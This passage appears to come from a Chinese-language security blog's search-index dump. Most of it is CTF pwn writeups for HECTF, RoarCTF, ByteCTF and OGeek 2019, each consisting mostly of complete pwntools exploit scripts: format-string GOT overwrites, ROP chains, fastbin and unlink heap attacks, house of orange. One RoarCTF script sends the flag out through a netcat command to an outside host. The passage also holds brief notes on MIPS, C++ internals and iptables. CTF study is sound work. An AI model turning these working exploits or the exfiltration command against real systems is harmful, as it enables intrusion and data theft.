"/bin/sh\x00" + p64(0) + p64(0x602018) update(2, payload) update(1, "\x90\xa3\x75") try: r.sendline("2") r.sendlineafter("delete?\n", str(2)) #gdb.attach(r) r.recvuntil(":") r.sendline("icq53fedba7ec7cecf0fd369c6e0a6bd") r.recvline() break except EOFError as e: r.close()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hectf-2019-quals]]></title>
    <url>%2Fposts%2Fd8a417f2%2F</url>
    <content type="text"><![CDATA[Middle_pwn格式化字符串泄露地址后直接写printf@got,调用system(&quot;/bin/sh&quot;) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#r = process("./pwn")r = remote("183.129.189.60", "10003")elf = ELF("./pwn")#gdb.attach(r, "b printf\nc")payload = "%3$paaaa"r.sendlineafter("Input: \n", payload)libc = int(r.recvuntil("aaaa")[:-4], 16) + 0x7fdf719a5000 - 0x7fdf71a9c260system = libc + 0x45390x = printf % 0x100y = (printf / 0x100) % 0x100z = (printf / 0x10000) % 0x100if (x &lt; y) or (x &lt; z): exit(1)payload = ""if y &gt; z: payload += "%" + str(z) + "c" + "%13$hhn" + "%" + str(y - z) + "c" + "%12$hhn" + "%" + str(x - y) + "c" + "%11$hhn"else: payload += "%" + str(y) + "c" + "%12$hhn" + "%" + str(z - y) + "c" + "%13$hhn" + "%" + str(x - z) + "c" + "%11$hhn"payload = payload.ljust(0x28, "\x00")payload += p64(elf.got["printf"])payload += p64(elf.got["printf"] + 1)payload += p64(elf.got["printf"] + 2)r.sendlineafter("Input: \n", payload)r.sendlineafter("Input: \n", "/bin/sh\x00")print "libc: " + hex(libc)r.interactive() stackpwn2泄露canary后正常ROP即可. 12345678910111213141516171819202122232425from pwn import *#r = process("./stackpwn2")r = remote("183.129.189.60", "10000")elf = ELF("./stackpwn2")r.sendlineafter("system...\n", "%9$paaaa")canary = int(r.recvuntil("aaaa")[:-4], 16)payload = "a" * 0x18 + p64(canary) + "a" * 0x8payload += p64(0x4009c3) + p64(elf.got['puts']) + p64(elf.plt['puts'])payload += p64(0x4009c3) + p64(0) + p64(0x4009c1) + p64(elf.got['puts']) + p64(0) + p64(elf.plt['read'])payload += p64(0x4009c3) + p64(elf.got['puts'] + 8) + p64(elf.plt['puts'])r.sendlineafter("to do?\n", payload)libc = u64(r.recvline()[:-1].ljust(8, "\x00")) + 0x7f219a466000 - 0x7f219a4d5690r.send(p64(libc + 0x45390) + "/bin/sh\x00")#gdb.attach(r)print "canary: " + hex(canary)print "libc: " + hex(libc)r.interactive() pwn_disco格式化字符串泄露地址,uaf漏洞,通过edit进行fastbin attack分配堆到bss段,修改堆指针任意写,改free_hook执行system(&quot;/bin/sh&quot;). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *#r = process("./pwn_disco")r = remote("183.129.189.60", "10002")elf = ELF("./pwn_disco")r.sendlineafter("Choice:", "1")payload = "%9$pabcd\x00"r.sendlineafter("to draw:\n", payload)canary = int(r.recvuntil("abcd")[:-4], 16)r.sendlineafter("Choice:", "1")payload = "%11$pefhg\x00"r.sendlineafter("to draw:\n", payload)pie = int(r.recvuntil("efhg")[:-4], 16) + 0x55fd68136000 - 0x55fd68137020r.sendlineafter("Choice:", "1")payload = "%3$pefhg\x00"r.sendlineafter("to draw:\n", payload)libc = int(r.recvuntil("efhg")[:-4], 16) + 0x7f2bf217f000 - 0x7f2bf2276260r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "a")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "1")r.sendafter("color:", "/bin/sh\x00")r.sendlineafter("Choice:", "3")r.sendlineafter("index:", "0")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "2")r.sendlineafter("index:", "0")r.sendafter("color:", p64(pie + 0x201890 + 0xd))r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "a")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "\x00" * 0x3 + p64(libc + 0x3c67a8))r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "2")r.sendlineafter("index:", "0")r.sendafter("color:", p64(libc + 0x45390))r.sendlineafter("Choice:", "3")r.sendlineafter("index:", "1")#gdb.attach(r)print "canary: " + hex(canary)print "libc: " + hex(libc)print "pie: " + hex(pie)r.interactive() HongBao+\n会使scanf正常执行同时不改变对应的值,先格式化字符串漏洞泄露,再重用漏洞调用system(&quot;/bin/sh&quot;). 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level = 'debug'main = 0x4008E7pop_rdi_ret = 0x400b73#r = process("./HongBao")r = remote("183.129.189.60", "10001")elf = ELF("./HongBao")#gdb.attach(r, "b * 0x400AB9\nc")r.sendlineafter("HongBao?\n", "Y")payload = "%pzz" * 12 + "\n"r.sendlineafter(" you: ", payload)r.sendlineafter("us?\n", str(0x80))payload = "+\n" * 46payload += str(main % 0x100000000) + "\n"payload += str(main / 0x100000000) + "\n"payload += "+\n" * (0x80 - 48)r.sendafter("have?\n", payload)data = r.recvuntil("Do you")libc = int(data.split("zz")[1], 16) + 0x7fbc06132000 - 0x7fbc064f8790r.sendlineafter("HongBao?\n", "Y")payload = "w4rd3n\n"r.sendlineafter(" you: ", payload)r.sendlineafter("us?\n", str(0x80))payload = "+\n" * 46payload += str(pop_rdi_ret % 0x100000000) + "\n"payload += str(pop_rdi_ret / 0x100000000) + "\n"payload += str((libc + 0x18cd57) % 0x100000000) + "\n"payload += str((libc + 0x18cd57) / 0x100000000) + "\n"payload += str((libc + 0x45390) % 0x100000000) + "\n"payload += str((libc + 0x45390) / 0x100000000) + "\n"payload += "+\n" * (0x80 - 52)r.sendafter("have?\n", payload)print "libc: " + hex(libc)r.interactive() Hard_pwnunsorted bin加堆溢出泄露地址,然后就是house_of_orange. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level = 'debug'def add(size): r.sendline("1") r.sendlineafter("size: ", str(size)) r.recvuntil(": ")def edit(index, size, content): r.sendline("2") r.sendlineafter("index: ", str(index)) r.sendlineafter("size: ", str(size)) r.sendafter("content:", content) r.recvuntil(": ")def dele(index): r.sendline("3") r.sendlineafter("index: ", str(index)) r.recvuntil(": ")def show(index): r.sendline("4") r.sendlineafter("index: ", str(index)) data = r.recvuntil("\n")[:-1] r.recvuntil(": ") return data#r = process("./pwn")r = remote("183.129.189.60", "10026")r.recvuntil(": ")add(0x90)#0add(0x90)#1add(0x90)#2add(0x90)#3add(0x90)#4dele(1)edit(0, 0x450, "a" * 0xa0)libc = u64(show(0)[0xac:0xb2].ljust(8, "\x00")) + 0x7fa7d8484000 - 0x7fa7d8848b78edit(0, 0x450, "a" * 0x90 + p64(0) + p64(0xa1))dele(3)edit(2, 0x450, "a" * 0xa0)heap = u64(show(2)[0xac:0xb2].ljust(8, "\x00")) + 0x5618028f4000 - 0x5618028f40a0edit(2, 0x450, "a" * 0x90 + p64(0) + p64(0xa1))dele(0)dele(2)dele(4)add(0x90)#0add(0x400)#1add(0x90)#2dele(1)payload = "a" * 0x90fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c5520 - 0x10)#3c5520 D _IO_list_all, fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x1a0)#fake_vtable_ptrfake_chunk = fake_chunk.ljust(0x100, "\x00")#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkpayload += p64(libc + 0x45390) * 0x10#fake_vtableedit(0, 0x450, payload)r.sendline("1")r.sendlineafter("size: ", str(1))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-MIPS-基础]]></title>
    <url>%2Fposts%2Ff71646bf%2F</url>
    <content type="text"><![CDATA[寄存器MIPS32寄存器分为两类:通用寄存器和特殊寄存器. MIPS体系结构中有32个通用寄存器,汇编程序中用$0 ~ $31表示.也可以用名称表示,如$sp,$t1等. MIPS体系结构中有3个特殊寄存器:PC(程序计数器),HI(乘除结果高位寄存器)和LO(乘除结果低位寄存器). 指令MIPS32指令特点:固定4字节指令长度;数据访问(load/store)必须严格对齐;MIPS采用了高度的流水线,其中一个重要的效应是分支延迟效应. 系统调用指令:SYSCALL指令是一个软中断,系统调用号存放在$v0中,参数存放在$a0-$a3中,如果参数过多,会存放在栈中. 函数调用MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处,但又有很大的区别. 没有ebp,进入一个函数时将当前栈指针向下移动n比特,这就是此函数的栈帧存储区域. 如果函数A调用函数B,调用者函数A会在自己的栈顶预留一部分空间来保存被调用者函数B的参数,称之为调用参数空间. 前四个参数通过$a0 ~ $a3传递,多余的参数会放入调用参数空间. MIPS32的调用指令把函数的返回地址直接存入$ra寄存器中. MIPS32架构根据函数是否调用其他函数将函数分成叶子函数与非叶子函数.父函数调用子函数时,会复制当前$PC的值到$ra寄存器,然后跳到子函数执行.子函数如果为非叶子函数,则会将返回地址存入堆栈,否则仍在$ra寄存器中.返回时,如果子函数为叶子函数,jr $ra直接返回,否则先从堆栈取出再返回. 系统调用MIPS32系统调用指令SYSCALL是一个软中断,系统调用号存放在$v0中,参数存放在$a0 ~ $a3中,如果参数过多,会存放在栈中.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-CPP]]></title>
    <url>%2Fposts%2F8df7ff9c%2F</url>
    <content type="text"><![CDATA[概览C++与C都是生成可执行程序,只不过C++有一些常用的自定义数据结构. mangleC++的符号名是被mangle过的,使用gdb时可以使用set print asm-demangle on恢复.类似的还有命令行工具c++filt. 虚函数表虚函数是支持C++多态的关键机制,对于每个具有虚函数的类,编译器将根据类的继承层次结构创建一个或多个相关的虚函数表(位于只读段). 相应的对象实例会有一个虚函数表指针指向对于类的虚函数表,而虚表劫持就是通过其他漏洞修改类实例的虚函数表指针. vectorvector是C++实现的动态数组类,空间不够时会申请两倍大小来放置内容,分配在堆中. 成员:_M_start,vector起始位置;_M_finish,vector结尾位置;_M_end_of_storage:容器最后位置. vector通过_M_finish和_M_end_of_storage判断空间是否足够. new &amp; deletenew与malloc类似,但配置失败会进行异常处理,而malloc返回null. delete与free类似. 复制构造函数与赋值操作符默认的复制构造函数与赋值操作符都是进行浅拷贝,也就是对于指针进行值复制. 默认使用复制构造函数的情况:对象作为函数参数,返回一个对象,部分容器操作等. 默认使用赋值操作符的情况:赋值语句,部分容器操作等.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-roarctf-2019]]></title>
    <url>%2Fposts%2Fe020a382%2F</url>
    <content type="text"><![CDATA[pwneasy_pwn存在后门off_by_one,堆重叠后伪造堆块进行fastbin attack,劫持_malloc_hook后触发one_gadget获得shell. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level = 'debug'def add(size): r.sendline('1') r.sendlineafter('size: ', str(size)) r.recvuntil('choice: ', timeout = 1)def edit(index, size, content): r.sendline('2') r.sendlineafter('index: ', str(index)) r.sendlineafter('size: ', str(size)) r.sendafter('content: ', content) r.recvuntil('choice: ', timeout = 1)def drop(index): r.sendline('3') r.sendlineafter('index: ', str(index)) r.recvuntil('choice: ', timeout = 1)def show(index): r.sendline('4') r.sendlineafter('index: ', str(index)) r.recvuntil('content: ') data = r.recvuntil('Note system')[:-11] r.recvuntil('choice: ', timeout = 1) return data#r = process('./easy_pwn')r = remote("39.97.182.233", "47400")r.recvuntil('choice: ', timeout = 1)add(0x78)#0add(0xe0)#1add(0x80)#2add(0x20)#3edit(1, 0xd8, "a" * 0xd0 + p64(0xe0))drop(1)edit(0, 0x82, "a" * 0x78 + "\xe1")add(0x80)#1add(0x40)#4drop(1)drop(2)add(0x80)#1libc = u64(show(4)[:6].ljust(8, "\x00")) - 0x3c4b78drop(1)add(0x100)#1edit(1, 0x100, "a" * 0x80 + p64(0) + p64(0x71) + "a" * 0x60 + p64(0) + p64(0x21))drop(4)edit(1, 0x98, "a" * 0x80 + p64(0) + p64(0x71) + p64(libc + 0x3c4b10 - 0x23))add(0x68)#2add(0x68)#4payload = "0" * 0x13 + p64(libc + 0xf02a4)edit(4, len(payload), payload)edit(1, 0x90, "a" * 0x80 + p64(0) + p64(0))drop(2)#gdb.attach(r)print "libc: " + hex(libc)r.interactive() easyheap由于限制了chunk_size,可以使用scanf触发malloc_conslidate合并(过长的输入会让scanf申请堆)构造unsorted bin. 存在uaf,可以利用后门进行unlink,结合house_of_spirit写random从而泄露libc.最后fastbin attack写__malloc_hook获取shell. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from pwn import *context.log_level = "debug"ptr = 0x602098def add(size, content): r.sendline("1") r.sendlineafter("the size\n", str(size)) r.sendafter("your content\n", content) r.recvuntil("&gt;&gt; ")def add2(size, content): sleep(0.1) r.sendline("1") sleep(0.1) r.sendline(str(size)) sleep(0.1) r.send(content) sleep(0.1)def dele(): r.sendline("2") r.recvuntil("&gt;&gt; ")def dele2(): sleep(0.1) r.sendline("2") sleep(0.1)def show(): r.sendline("3") data = r.recvuntil("every")[:-6] return datadef back(choice, content = ""): r.sendline("666") r.sendlineafter("or free?\n", str(choice)) if choice == 1: r.sendafter("your content\n", content) r.recvuntil("&gt;&gt; ")r = process("./pwn")r.sendafter("username:", p64(0) * 3 + p64(0x41))r.sendafter("info:", p64(0) + p64(0x51) + p64(0) + p64(0x51))r.recvuntil("&gt;&gt; ")add(0x20, "a" * 0x20)dele()add(0x50, "a" * 0x50)dele()add(0x30, "a" * 0x30)dele()add(0x60, "a" * 0x50 + p64(0) + p64(0x31))dele()add(0x10, "a" * 0x10)add(0x30, "a" * 0x30)dele()r.sendline("1" * 0x400)payload = p64(0) + p64(0x81) + p64(ptr - 0x18) + p64(ptr - 0x10)payload = payload.ljust(0x80, "\x00")payload += p64(0x80) + p64(0xa0)back(1, payload)dele()#unlinkback(2)#house_of_spiritadd(0x38, p64(0) * 2 + p64(0xDEADBEEFDEADBEEF))add(0x80, "a")libc = u64(show().ljust(8, "\x00")) + 0x7f4da9961000 - 0x7f4da9d25b61dele2()add2(0x10, "a")add2(0x68, "a")dele2()add2(0x80, "a")add2(0x40, "a" * 0x20 + p64(0) + p64(0x71) + p64(libc + 0x3c4b10 - 0x23))add2(0x68, "a")add2(0x68, "\x00" * 0x13 + p64(libc + 0xf02a4))dele2()#gdb.attach(r)print "libc: " + hex(libc)r.sendline("cat flag | nc 192.168.235.128 1234")r.interactive() 由于关闭了标准输出和标准错误输出,使用反弹shell传输flag.服务器端监听端口:nc -l 1234. easyrop明显的栈溢出,注意溢出时会覆盖偏移变量. 题目限制了execve,使用栈迁移加orw获取flag. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = 'debug'pop_rdi_ret = 0x401b93pop_rsi_r15_ret = 0x401b91pop_rsp_r13_r14_r15_ret = 0x401b8ddef csu_pop(r12, r13 = 0, r14 = 0, r15 = 0): payload1 = p64(0x401B8A) #pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn; payload1 += p64(0) + p64(1) payload1 += p64(r12) + p64(r13) + p64(r14) + p64(r15) return payload1#r12(r13, r14, r15)def csu_mov_call_pop(r12 = 0, r13 = 0, r14 = 0, r15 = 0): #mov rdx, r13;mov rsi, r14;mov edi, r15d;call qword ptr [r12 + rbx * 8];...; payload2 = p64(0x401B70) payload2 += p64(0xdeadbeef) + p64(0) + p64(1) payload2 += p64(r12) + p64(r13) + p64(r14) + p64(r15) return payload2r = process("./pwn")elf = ELF("./pwn")gdb.attach(r, "b * 0x401B2B\nc")r.sendafter("&gt;&gt; ", "a" * 0x418 + "\x28")payload = csu_pop(elf.got['puts'], 0x603060)payload += csu_mov_call_pop()payload += p64(0x4019F3)r.sendline(payload)r.recvline()libc = u64(r.recvline()[1:-1].ljust(8, "\x00")) + 0x7fbdeb9b1000 - 0x7fbdebd76620r.sendafter("&gt;&gt; ", "a" * 0x418 + "\x28")payload = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(0x6030c0) + p64(0) + p64(libc + 0xf7250)payload += p64(pop_rsp_r13_r14_r15_ret) + p64(0x6030c0)r.sendline(payload)payload = p64(0) * 3payload += p64(pop_rdi_ret) + p64(0x6032c8) + p64(pop_rsi_r15_ret) + p64(2) + p64(0) + p64(libc + 0xf7030)payload += csu_pop(0x6032c0, 3, 0x6032c8, 0x20)payload += csu_mov_call_pop(elf.got['puts'], 0x6032c8)payload += csu_mov_call_pop()payload = payload.ljust(0x200, "\x00")payload += p64(libc + 0xf7250) + "flag\x00"r.send(payload)print "libc: " + hex(libc)r.interactive() realloc_magic环境为libc2.27,明显的double free. 两个关键点:realloc在ptr != 0 &amp;&amp; size == 0时等同于free,返回值为0;realloc在ptr == 0时等同于malloc. 剩下的解题思路和de1ctf2019的weapon差不多,通过堆重叠劫持fd. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *def re(size, content): r.sendline("1") r.sendlineafter("Size?\n", str(size)) r.sendafter("Content?\n", content) r.recvuntil("&gt;&gt; ")def re_fr(): r.sendline("1") r.sendlineafter("Size?\n", str(0)) r.recvuntil("&gt;&gt; ")def fr(): r.sendline("2") r.recvuntil("&gt;&gt; ")def ba(): r.sendline("666") r.recvuntil("&gt;&gt; ")while(1): r = process("./pwn") r.recvuntil("&gt;&gt; ") re(0x68, "a") re_fr() re(0x88, "a") re_fr() re(0xa8, "a") re_fr() re(0x88, "a") for i in range(7): fr() re_fr() re(0x68, "a") re(0xf8, "\x00" * 0x68 + p64(0x21) + "\x60\x77") re_fr() re(0x88, "a") re_fr() try: r.sendline("1") r.sendlineafter("Size?\n", str(0x88)) r.sendafter("Content?\n", p64(0xfbad3887) + p64(0) * 3 + "\xc8") data = r.recvuntil(p64(0xffffffffffffffff), timeout = 1) if p64(0xffffffffffffffff) not in data: r.close() continue r.recvuntil("&gt;&gt; ") libc = u64(data[:6].ljust(8, "\x00")) - 0x7f9d716c6a00 + 0x7f9d712db000 free_hook = libc + 0x3ed8e8 system = libc + 0x4f440 ba() re(0xf8, "\x00" * 0x68 + p64(0xa1) + p64(free_hook - 8)) re_fr() re(0x18, "a") re_fr() re(0x18, "/bin/sh\x00" + p64(system)) except EOFError as e: r.close() continue gdb.attach(r) print "libc: " + hex(libc) breakfr()r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bytectf-2019-finals-unknow]]></title>
    <url>%2Fposts%2Fcff0c71b%2F</url>
    <content type="text"><![CDATA[漏洞程序使用了线程处理2对应的操作,start_routine是处理函数. 逆向发现在获取堆指针的值之后处理函数会休眠一段时间,这里出现了条件竞争漏洞,只需要在此时改变堆指针布局就可以劫持控制流. 利用思路payload. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *context.log_level = 'debug'pop_rdi_ret = 0x42334dpop_rsi_ret = 0x42327bpop_rdx_ret = 0x4bb153cout_char_str = 0x407220_ZNSi4readEPcl_plt = 0x403c90def add(size, content): r.sendlineafter("Options:", "1") r.sendlineafter("size:", str(size)) r.sendlineafter("Data:", content) r.recvuntil("Success") offset = int(r.recvuntil("\n")[:-1]) print "offset: " + hex(offset)#r = process("./pwn")r = remote("172.29.18.11", "9999")gdb.attach(r, "b * 0x407843")add(128, "a" * 0x67 + p64(0x4079d1) + "\x00" + p64(0) * 2)#chunk1add(80, "b" * 0x50)add(80, "a" * 0x10 + p64(0x45d9ca) + p64(0) * 7)#chunk3add(32, "d" * 0x20)r.sendlineafter("Options:", "2")payload = "c" * 0xcd2f + p64(pop_rdi_ret) + p64(0x6eefd8) + p64(cout_char_str) + p64(pop_rdi_ret) + p64(0x6ef600) + p64(pop_rsi_ret) + p64(0x6ef340) + p64(pop_rdx_ret) + p64(0x8)payload += p64(_ZNSi4readEPcl_plt) + p64(0x4079d1) + p64(0x405610) + "1" + p64(0xdeadbeef) * 10payload = payload.ljust(0xd000, "\x00")add(53248, payload)#chunk5payload = p64(0x4a0dc0) + p8(0x78)#.rodata:00000000004A0DC0 off_4A0DC0 dq offset unk_6EE1E0#unk_6EE1F0处的值指向_ZNKSt9type_info15__is_function_pEv.#通过偏移使第二个处理参数指向chunk3,调用0x45d9ca执行关键指令xchg esp,eax#处理完后esp刚好指向chunk1中,布置好gadget:ret,同时栈跨越到chunk5中,布置好rop链.#0x405610会调用0x6eefd8r.sendlineafter("Options:", "1")r.sendlineafter("size:", str(32))r.sendafter("Data:", payload)libc = u64(r.recv()[:6].ljust(8, "\x00")) - 0x21ab0r.send("a" * 7 + p64(libc + 0x10a38c)* 9)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-Linux-Server-iptables]]></title>
    <url>%2Fposts%2F8b2c915f%2F</url>
    <content type="text"><![CDATA[概览iptables命令是Linux上常用的防火墙软件,属于netfilter项目的一部分.可直接配置,也可以通过前端和图形界面配置. 选项123456789101112131415161718192021222324252627282930313233343536373839404142434445464748-t, --table table#对指定的表table进行操作,table必须是raw,nat,filtermangle中的一个.如果不指定此选项,默认的是filter表.-p#指定要匹配的数据包协议类型-s, --source [!] address[/mask]#把指定的一个/一组地址作为源地址,按此规则进行过滤.当后面没有mask时,address是一个地址;当mask指定时,可以表示一组范围内的地址,比如:192.168.1.0/255.255.255.0.-d, --destination [!] address[/mask]#地址格式同上,但这里是指定地址为目的地址,按此进行过滤.-i, --in-interface [!] &lt;网络接口name&gt;#指定数据包的来自来自网络接口,比如最常见的eth0.注意:它只对INPUT,FORWARD,PREROUTING这三个链起作用.如果没有指定此选项,说明可以来自任何一个网络接口.同前面类似,"!"表示取反.-o, --out-interface [!] &lt;网络接口name&gt;#指定数据包出去的网络接口.只对OUTPUT,FORWARD,POSTROUTING三个链起作用.--dport num#匹配目标端口号--sport num#匹配来源端口号-L, --list [chain]#列出链chain上面的所有规则,如果没有指定链,列出表上所有链的所有规则.-A, --append chain rule-specification#在指定链chain的末尾插入指定的规则,最后才会被执行.规则是由后面的匹配来指定.-I, --insert chain [rulenum] rule-specification#在链chain中的指定位置插入一条或多条规则.如果指定的规则号是1,则在链的头部插入.这也是默认的情况.-D, --delete chain rule-specification -D, --delete chain rulenum#在指定的链chain中删除一个或多个指定规则.-R num#Replays替换/修改第几条规则.-P, --policy chain target#为指定的链chain设置策略target.注意,只有内置的链才允许有策略,用户自定义的是不允许的.-F, --flush [chain]#清空指定链chain上面的所有规则.如果没有指定链,清空该表上所有链的所有规则.-N, --new-chain chain#用指定的名字创建一个新的链.-X, --delete-chain [chain]#删除指定的链,这个链必须没有被其它任何规则引用,而且这条上必须没有任何规则.如果没有指定链名,则会删除该表中所有非内置的链.-E, --rename-chain old-chain new-chain#用指定的新名字去重命名指定的链,这并不会对链内部照成任何影响.-Z, --zero [chain]#把指定链,或者表中的所有链上的所有计数器清零.-j, --jump target &lt;指定目标&gt;#即满足某条件时该执行什么样的动作.target可以是内置的目标,比如ACCEPT,也可以是用户自定义的链.-h#显示帮助信息. 命令举例:iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作. 工作机制规则链名包括(也被称为五个钩子函数): INPUT链:处理输入数据包. OUTPUT链:处理输出数据包. FORWARD链:处理转发数据包. PREROUTING链:用于目标地址转换(DNAT). POSTOUTING链:用于源地址转换(SNAT). 防火墙策略一般分为两种,一种叫通策略,一种叫堵策略.通策略,默认门是关着的,必须要定义谁能进;堵策略则是,大门是洞开的,但是你必须有身份认证,否则不能进. filter定义允许或者不允许,只能作用在3个链上:INPUT,FORWARD,OUTPUT.nat定义地址转换,只能作用在3个链上:PREROUTING,OUTPUT,POSTROUTING.mangle修改报文原数据,5个链都可以使用.修改报文原数据就是修改TTL.能够将数据包的元数据拆开,在里面做标记/修改内容.防火墙标记其实就是靠mangle来实现的. 表名包括: raw:高级功能,如:网址过滤. mangle:数据包修改(QOS),用于实现服务质量. nat:地址转换,用于网关路由器. filter:包过滤,用于防火墙规则. 动作包括: ACCEPT:接收数据包. DROP:丢弃数据包. REDIRECT:重定向,映射,透明代理. SNAT:源地址转换. DNAT:目标地址转换. MASQUERADE:IP伪装(NAT),用于ADSL LOG:日志记录. 实例12345678910111213141516171819202122iptables -F#清空所有的防火墙规则.iptables -X#删除用户自定义的空链.iptables -Z#清空计数.iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT#22为ssh端口,-s 192.168.1.0/24表示允许这个网段的机器来连接,-j ACCEPT表示接受请求.iptables -P INPUT DROP#配置默认的不让进.iptables -P FORWARD DROP#默认的不允许转发.iptables -P OUTPUT ACCEPT#默认的可以出去.iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT#允许被ping.iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT#已经建立的连接让它进来.iptables-save &gt; /etc/sysconfig/iptables#保存规则到配置文件中.cp /etc/sysconfig/iptables /etc/sysconfig/iptables.bak#备份配置文件.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Linux-Server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ogeek-2019-babyheap]]></title>
    <url>%2Fposts%2F6b700116%2F</url>
    <content type="text"><![CDATA[babyheap参考:http://blog.eonew.cn/archives/1216. polish函数堆溢出. 1234567891011void polish()&#123; /* code */ scanf_wrapper("%d", size); puts("Then name it again : "); read_n(g_sword[idx], size); /* code */&#125; 可以利用该漏洞进行unlink攻击,为了绕过对chunk header的检测需要泄露Freed chunk的chunk header. 要防止fake_chunk是ListHints的表头,否则会导致check失败. 任意读写后就可以通过iat表泄露dll基址,再通过ntdll!PebLdr附近的一个地址减偏移获得PEB地址,又PEB和TEB的地址的偏移是固定的,计算出线程的TEB的地址,最后通过TEB泄露SEH地址减偏移获得返回地址的地址劫持控制流即可. 由于环境原因payload只完成到泄露部分. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = "debug"def make(size, content): r.sendlineafter("your choice?", "1") r.sendlineafter("your sword?", str(size)) r.sendlineafter("Name it!", content)def destroy(index): r.sendlineafter("your choice?", "2") r.sendlineafter("want to destroy?", str(index))def polish(index, size, content): r.sendlineafter("your choice?", "3") r.sendlineafter("you polish?", str(index)) r.sendlineafter("length this time?", str(size)) r.sendlineafter("it again : ", content)def check(index): r.sendlineafter("your choice?", "4") r.sendlineafter("will you check?", str(index)) r.recvuntil("Show : ") data = r.recvuntil("\r\n")[:-2] return datar = remote("192.168.235.1", "4444")r.recvuntil("gift : ")image = int(r.recvuntil("\r\n")[:-2], 16) - 0x1090make(0x58, "\n")#0make(0x58, "\n")#1make(0x58, "\n")#2make(0x58, "\n")#3make(0x58, "\n")#4make(0x58, "\n")#5destroy(2)destroy(4)#leak free_chunk_headerfree_chunk_header = ""while(len(free_chunk_header) &lt; 8): polish(1, 0x58 + len(free_chunk_header), 'a' * (0x58 + len(free_chunk_header))) free_chunk_header += check(1)[0x58 + len(free_chunk_header):] + "\x00"free_chunk_header = free_chunk_header[:8]polish(1, 0x60, 'a' * 0x58 + free_chunk_header)#unlinkpolish(1, 0x68, 'b' * 0x58 + free_chunk_header + p32(image + 0x4370 + 4) + p32(image + 0x4370 + 8))destroy(1)r.sendlineafter("your choice?", "1337")r.sendlineafter("target?", str(image + 0x0043BC + 2))polish(2, 4, p32(image + 0x4370))polish(2, 4, p32(image + 0x4370))puts_iat = image + 0x30C8#ucrtbase.dllHeapCreate_iat = image + 0x3000#kernel32.dllpolish(0, 0xc, p32(image + 0x4370) + p32(0) + p32(puts_iat))ucrtbase = u32(check(2)[:4])polish(0, 0xc, p32(image + 0x4370) + p32(0) + p32(HeapCreate_iat))kernel32 = u32(check(2)[:4])log.success("image: " + hex(image))log.success("ucrtbase: " + hex(ucrtbase))log.success("kernel32: " + hex(kernel32))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Windows-NtHeap-pwn-unlink]]></title>
    <url>%2Fposts%2Fd624b47%2F</url>
